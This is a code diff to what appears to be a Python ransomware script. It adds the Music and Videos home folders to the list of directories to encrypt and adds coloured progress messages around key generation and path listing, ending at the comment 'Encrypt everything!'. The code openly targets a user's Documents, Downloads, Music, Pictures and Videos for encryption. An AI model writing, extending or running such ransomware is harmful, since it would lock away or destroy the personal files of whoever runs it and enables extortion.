@@ -126,17 +126,30 @@ def deransomware(dirsToEncrypt):
 if __name__ == '__main__':
 
     # Generate an encryption key.
+    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating encryption key...")
     generate_key()
     
     # Generate file paths for this user.
+    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating file paths to encrypt...")
     documentsFolder = os.path.join(os.path.expanduser('~'), 'Documents')
     downloadsFolder = os.path.join(os.path.expanduser('~'), 'Downloads')
+    musicFolder = os.path.join(os.path.expanduser('~'), 'Music')
     picturesFolder = os.path.join(os.path.expanduser('~'), 'Pictures')
+    videosFolder = os.path.join(os.path.expanduser('~'), 'Videos')
+    
+    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generated file paths to encrypt:")
+    print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+documentsFolder+f"{bcolors.ENDC}]")
+    print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+downloadsFolder+f"{bcolors.ENDC}]")
+    print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+musicFolder+f"{bcolors.ENDC}]")
+    print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+picturesFolder+f"{bcolors.ENDC}]")
+    print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+videosFolder+f"{bcolors.ENDC}]")
     
     commonDirectories = [
         documentsFolder,
         downloadsFolder,
+        musicFolder,
         picturesFolder,
+        videosFolder,
     ]
     
     # Encrypt everything!
